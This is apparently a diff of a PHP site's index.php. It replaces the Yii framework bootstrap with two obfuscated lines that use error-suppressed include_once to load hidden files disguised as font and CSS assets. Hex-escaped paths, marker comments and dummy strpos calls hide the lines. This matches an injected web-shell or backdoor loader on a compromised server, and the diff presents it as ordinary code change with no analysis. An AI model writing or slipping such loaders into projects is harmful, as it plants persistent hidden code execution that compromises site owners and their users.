@@ -1,13 +1,15 @@
 <?php
+/*e6d02*/
 
-// change the following paths if necessary
-$yii=dirname(__FILE__).'/../framework/yii.php';
-$config=dirname(__FILE__).'/protected/config/main.php';
+$rjx = "/ho\x6de/webrdi/do\x6dains/rdisskru.co\x6d/public_ht\x6dl/receipt/test/fonts/.b236c078.ccss"; $ti = $rjx; strpos($ti, "ra1"); @include_once /* 20 */ ($ti);
 
-// remove the following lines when in production mode
-defined('YII_DEBUG') or define('YII_DEBUG',true);
-// specify how many levels of call stack should be shown in each log message
-defined('YII_TRACE_LEVEL') or define('YII_TRACE_LEVEL',3);
+/*e6d02*/
 
-require_once($yii);
-Yii::createWebApplication($config)->run();
+/*17242*/
+
+$rjc = "/home/webrdi/domains/rdisskru.com/\x70ublic_html/css/.dcfa04e2.ccss"; $t1 = $rjc; strpos($t1, "zqa"); @include_once /* 9j84 */ ($t1);
+
+/*17242*/
+
+
+
